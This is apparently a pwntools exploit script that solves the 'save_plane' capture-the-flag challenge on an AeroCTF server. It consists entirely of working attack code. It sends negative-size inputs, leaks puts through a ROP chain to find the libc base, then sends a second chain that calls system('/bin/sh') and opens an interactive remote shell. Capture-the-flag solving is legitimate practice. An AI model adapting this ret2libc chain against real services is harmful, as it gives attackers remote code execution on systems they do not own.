from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
# r = process('./save_plane')
r = remote('tasks.aeroctf.com', 33027)
libc = ELF('./libc.so.6')
elf = ELF('./save_plane')
main = elf.symbols['main']
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']

pop_rdi = 0x000000000040156b #: pop rdi ; ret
pop_rdx_rsi = 0x0000000000107569 #: pop rdx ; pop rsi ; ret
ret  =0x0000000000401016 #: ret

go = lambda x: r.sendlineafter('> ', str(x))
ii = lambda x: r.sendlineafter(': ', str(x))
i0 = lambda x: r.sendafter(': ', str(x))

# gdb.attach(r, '''c''')

i0('135168\n')
i0('-4424\n')

p = p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)

ii(p)

leak = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
libc_base = leak - libc.symbols['puts']
libc_system = libc_base + libc.symbols['system']
libc_binsh = libc_base + next(libc.search('/bin/sh\x00'))
one_gadgets = [820442, 820445, 820448, 943691]
one_gadget = libc_base + one_gadgets[0]
log.info('libc base : 0x%x' % libc_base)
log.info('libc system : 0x%x' % libc_system)

i0('135168\n')
i0('-4424\n')

p = p64(ret)
p += p64(pop_rdi)
p += p64(libc_binsh)
p += p64(libc_system)

ii(p)

r.interactive()
